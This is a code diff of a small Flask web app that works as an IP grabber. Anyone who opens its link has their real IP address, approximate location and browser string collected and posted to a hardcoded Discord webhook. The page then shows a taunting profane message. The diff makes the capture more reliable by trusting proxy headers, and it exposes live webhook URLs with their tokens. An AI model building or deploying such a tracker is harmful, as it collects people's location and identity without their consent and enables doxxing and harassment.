@@ -2,28 +2,32 @@
 from flask import Flask, request
 from datetime import datetime
 import requests
+from werkzeug.middleware.proxy_fix import ProxyFix
 
 app = Flask(__name__)
+# Trust the first proxy in front of us so request.remote_addr is real client IP
+app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)
 
-# → Replace this with your real webhook URL:
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/1368661778724294759/6bgqzVwWDt2xZ-SxJYJ57CCvUa-juXe-1s71ivICcyvF49OFB5irFEgsDp7MH5BMOxkp"
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/1368661794326974555/1s8zTlN5aPPn3RjbL-faGmWWOnnbD4SqQ5Fd8VF6PaU4OmmiJCucrXHW8LFNAQMrSvee"
 
 @app.route('/')
 def log_ip():
     ip = request.remote_addr
     ua = request.headers.get('User-Agent', 'Unknown')
 
-    # — Geo‑lookup via ip-api.com (free, no key needed)
+    # Geo‑lookup
     try:
-        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,city,regionName,country").json()
+        geo = requests.get(
+            f"http://ip-api.com/json/{ip}?fields=status,city,regionName,country",
+            timeout=3
+        ).json()
         if geo.get("status") == "success":
-            location = f"{geo.get('city')}, {geo.get('regionName')}, {geo.get('country')}"
+            location = f"{geo['city']}, {geo['regionName']}, {geo['country']}"
         else:
             location = "Unknown, , "
     except Exception:
         location = "Unknown, , "
 
-    # — Build your message
     message = (
         f"New click!\n"
         f"IP: {ip}\n"
@@ -31,25 +35,21 @@ def log_ip():
         f"UA: {ua}"
     )
 
-    # — Send to webhook (Slack/Discord style)
+    # Post to Discord (Discord expects 'content', not 'text')
     try:
         requests.post(
             WEBHOOK_URL,
-            json={"text": message},
-            headers={"Content-Type": "application/json"},
+            json={"content": message},
             timeout=5
         )
     except Exception as e:
-        # optional: log errors locally
         with open("webhook_errors.log", "a") as err:
             err.write(f"{datetime.now()} — webhook error: {e}\n")
 
-    # — (Optionally still log locally)
     with open("ip_log.txt", "a") as f:
         f.write(f"{datetime.now()} - {ip} - {location} - {ua}\n")
 
     return "Testing Testing Motherfucker"
 
 if __name__ == '__main__':
-    # In production, use: app.run(host="0.0.0.0", port=80)
     app.run()
